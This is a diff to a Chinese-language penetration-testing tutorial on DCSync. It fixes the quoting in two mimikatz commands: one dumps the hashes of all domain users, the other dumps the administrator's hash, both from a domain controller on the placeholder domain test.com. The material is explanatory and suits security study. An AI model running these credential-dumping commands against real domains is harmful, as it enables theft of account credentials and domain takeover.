@@ -416,13 +416,13 @@ DCSync是mimikatz的一个功能，能够模拟域控制器并从域控制器导
 如果我们在域内一台主机上获得了域管理员权限，可以使用如下命令直接导出域内所有用户的hash：
 
 ```
-mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv exit"
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
 ```
 
 导出域内administrator帐户的hash：
 
 ```
-mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator exit"
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
 ```
 
 默认情况下，只有`Domain Controllers`和`Enterprise Domain Admins`权限能够使用DCSync
